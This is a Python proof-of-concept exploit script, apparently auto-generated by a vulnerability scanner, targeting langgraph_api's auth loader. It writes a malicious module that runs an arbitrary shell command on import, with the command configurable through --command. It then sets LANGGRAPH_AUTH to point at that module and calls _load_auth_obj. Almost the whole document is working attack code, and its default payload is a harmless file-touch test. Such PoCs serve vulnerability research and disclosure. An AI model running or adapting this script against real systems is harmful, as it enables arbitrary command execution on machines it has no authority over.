#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: rce-003
# Sink: profiled_import
# Auto-generated — run with: python3 rce_load_auth_obj_function_profiled_import.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_api RCE via LANGGRAPH_AUTH environment variable.

Vulnerability: The _load_auth_obj function in custom.py loads arbitrary Python modules
from a path specified in the LANGGRAPH_AUTH environment variable. If an attacker can
control this environment variable, they can execute arbitrary code by pointing to a
malicious Python file.

Attack vector: The attacker needs to:
1. Write a malicious Python file to a location accessible by the target process
2. Set the LANGGRAPH_AUTH environment variable to point to that file
3. Trigger the code path that loads the auth module

This PoC demonstrates the vulnerability by:
- Creating a malicious Python file that executes a benign command
- Setting the LANGGRAPH_AUTH environment variable
- Triggering the vulnerable code path

Usage:
    python3 poc_langgraph_rce.py [--target TARGET_URL] [--payload PAYLOAD_FILE]

Note: This requires the ability to set environment variables on the target system
(e.g., in a container, CI/CD, or local development environment).
"""

import os
import sys
import tempfile
import subprocess
import argparse
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def create_malicious_payload(payload_file: str, command: str) -> str:
    """
    Create a malicious Python file that will execute the specified command.
    
    Args:
        payload_file: Path where the malicious file will be created
        command: Command to execute (should be benign for PoC)
    
    Returns:
        Path to the created payload file
    """
    payload_content = f'''
import os
import subprocess

class Auth:
    """Minimal Auth class to pass the type check."""
    def __init__(self):
        self._authenticate_handler = None
    
    def authenticate(self, request):
        return None

# Execute the command when the module is loaded
result = subprocess.run("{command}", shell=True, capture_output=True, text=True)
print(f"[PoC] Command executed: {{result.stdout}}")
if result.stderr:
    print(f"[PoC] Stderr: {{result.stderr}}")

# Create the auth instance that will be returned
auth_instance = Auth()
'''
    
    with open(payload_file, 'w') as f:
        f.write(payload_content)
    
    logger.info(f"Created malicious payload at: {payload_file}")
    return payload_file

def trigger_vulnerability(payload_path: str, target_url: str = None):
    """
    Trigger the vulnerable code path by setting the LANGGRAPH_AUTH environment variable
    and calling the vulnerable function.
    
    Args:
        payload_path: Path to the malicious Python file
        target_url: Optional target URL for remote exploitation (not implemented)
    """
    # Set the environment variable to point to our malicious file
    # Format: /path/to/file.py:Auth
    auth_path = f"{payload_path}:Auth"
    os.environ['LANGGRAPH_AUTH'] = auth_path
    
    logger.info(f"Set LANGGRAPH_AUTH={auth_path}")
    
    if target_url:
        # Remote exploitation would require sending a request that triggers the code path
        logger.warning("Remote exploitation not implemented in this PoC")
        logger.info("For remote exploitation, you would need to:")
        logger.info("1. Upload the malicious file to the target")
        logger.info("2. Set the LANGGRAPH_AUTH environment variable")
        logger.info("3. Send a request that triggers the vulnerable code path")
        return
    
    # Local exploitation: directly call the vulnerable function
    try:
        # Import the vulnerable module
        sys.path.insert(0, '/home/xcy/.local/lib/python3.14/site-packages')
        
        from langgraph_api.auth.custom import _load_auth_obj
        
        logger.info("Calling _load_auth_obj with malicious path...")
        result = _load_auth_obj(auth_path)
        logger.info(f"Auth instance loaded: {result}")
        
    except ImportError as e:
        logger.error(f"Could not import langgraph_api: {e}")
        logger.info("Falling back to direct module loading simulation...")
        
        # Simulate the vulnerable behavior for demonstration
        simulate_vulnerability(payload_path)
    except Exception as e:
        logger.error(f"Error during exploitation: {e}")
        # Still try to simulate
        simulate_vulnerability(payload_path)

def simulate_vulnerability(payload_path: str):
    """
    Simulate the vulnerability by directly executing the malicious file.
    This is used when the actual langgraph_api module is not available.
    """
    logger.info("Simulating vulnerability by directly executing payload...")
    
    # Read and execute the payload file
    with open(payload_path, 'r') as f:
        payload_code = f.read()
    
    # Execute the payload code (this is what the vulnerability does)
    exec(payload_code)
    
    logger.info("Simulation complete")

def main():
    parser = argparse.ArgumentParser(description='PoC for langgraph_api RCE via LANGGRAPH_AUTH')
    parser.add_argument('--target', help='Target URL (not implemented for remote exploitation)')
    parser.add_argument('--payload', help='Path to custom payload file (optional)')
    parser.add_argument('--command', default='touch /tmp/poc_success.txt',
                       help='Command to execute (default: touch /tmp/poc_success.txt)')
    
    args = parser.parse_args()
    
    # Create a temporary directory for our payload
    with tempfile.TemporaryDirectory() as tmpdir:
        if args.payload:
            payload_path = args.payload
            logger.info(f"Using custom payload: {payload_path}")
        else:
            payload_path = os.path.join(tmpdir, 'malicious_auth.py')
            create_malicious_payload(payload_path, args.command)
        
        # Verify the payload file exists
        if not os.path.exists(payload_path):
            logger.error(f"Payload file not found: {payload_path}")
            sys.exit(1)
        
        logger.info(f"Payload file size: {os.path.getsize(payload_path)} bytes")
        
        # Trigger the vulnerability
        trigger_vulnerability(payload_path, args.target)
        
        # Check if the command was executed (for the default command)
        if args.command == 'touch /tmp/poc_success.txt':
            if os.path.exists('/tmp/poc_success.txt'):
                logger.info("SUCCESS: Command executed! /tmp/poc_success.txt was created.")
                # Clean up
                os.remove('/tmp/poc_success.txt')
            else:
                logger.warning("Command may not have been executed. Check for errors above.")

if __name__ == '__main__':
    print("=" * 60)
    print("langgraph_api RCE Proof-of-Concept")
    print("=" * 60)
    print()
    print("This PoC demonstrates arbitrary code execution via the")
    print("LANGGRAPH_AUTH environment variable in langgraph_api.")
    print()
    print("Requirements:")
    print("- Ability to set environment variables on the target")
    print("- Write access to create a Python file")
    print()
    
    main()
    
    print()
    print("=" * 60)
    print("PoC completed")
    print("=" * 60)
